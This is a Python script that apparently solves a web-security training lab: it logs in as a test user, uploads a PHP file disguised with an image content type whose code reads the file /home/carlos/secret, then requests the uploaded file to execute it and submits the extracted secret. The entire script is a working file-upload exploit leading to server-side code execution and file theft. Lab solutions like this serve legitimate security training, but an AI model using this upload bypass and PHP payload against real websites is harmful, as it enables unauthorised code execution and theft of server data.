import requests
import sys
import re
from bs4 import BeautifulSoup

base_url = sys.argv[1]
login_url = f"{base_url}/login"
my_account_url = f"{base_url}/my-account?id=wiener"
upload_url = f"{base_url}/my-account/avatar"
files_url = f"{base_url}/files/avatars/polyglot.php"
submit_solution_url = f"{base_url}/submitSolution"
login_data = {"username": "wiener", "password": "peter"}

session = requests.Session()

if len(sys.argv) != 2:
    sys.exit(1)

response = session.get(login_url)
soup = BeautifulSoup(response.text, 'html.parser')
csrf_token = soup.find('input', {'name': 'csrf'})['value']

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}
data = login_data.copy()
data['csrf'] = csrf_token
session.post(login_url, headers=headers, data=data).raise_for_status()

response = session.get(my_account_url)
soup = BeautifulSoup(response.text, 'html.parser')
csrf_token = soup.find('input', {'name': 'csrf'})['value']

headers = {
    'Content-Type': 'multipart/form-data; boundary=---------------------------362455303223982269392954944542'
}
data = (
    "-----------------------------362455303223982269392954944542\r\n"
    "Content-Disposition: form-data; name=\"avatar\"; filename=\"polyglot.php\"\r\n"
    "Content-Type: image/jpeg\r\n\r\n"
    "<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>\r\n"
    "-----------------------------362455303223982269392954944542\r\n"
    "Content-Disposition: form-data; name=\"user\"\r\n\r\n"
    "wiener\r\n"
    "-----------------------------362455303223982269392954944542\r\n"
    "Content-Disposition: form-data; name=\"csrf\"\r\n\r\n"
    f"{csrf_token}\r\n"
    "-----------------------------362455303223982269392954944542--\r\n"
)
session.post(upload_url, headers=headers, data=data).raise_for_status()

response = session.get(files_url)
response.raise_for_status()
match = re.search(r'START (.*?) END', response.text)
file_content = match.group(1) if match else ''

response = session.post(submit_solution_url, data={'answer': file_content})
response.raise_for_status()
print(response.text)
